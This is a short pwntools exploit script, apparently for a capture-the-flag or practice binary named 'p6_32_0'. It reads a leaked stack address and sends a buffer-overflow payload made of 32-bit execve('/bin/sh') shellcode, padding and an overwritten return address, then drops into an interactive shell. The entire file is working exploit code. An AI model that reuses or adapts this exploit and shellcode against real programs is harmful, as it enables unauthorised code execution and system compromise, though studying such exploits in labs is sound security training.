from pwn import *

#context.log_level = "DEBUG"

successful = 0x0804864f
failed = 0x08048661

p = process("./p6_32_0")

p.recvuntil("0x")
leak = int(p.recvline()[:-1],16)
print "leak = 0x%x" % leak

p.sendlineafter(" : ", "aaaa")
p.sendlineafter(" : ", "bbbb")

shellcode = """
// execve("//bin/sh")
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
mov eax, 0xb
int 0x80
"""

shellcode = asm(shellcode)

payload = shellcode
payload += "a"*(0x6c+4 - len(payload))
payload += p32(leak)

p.sendafter("nicname\n", payload)

p.interactive()
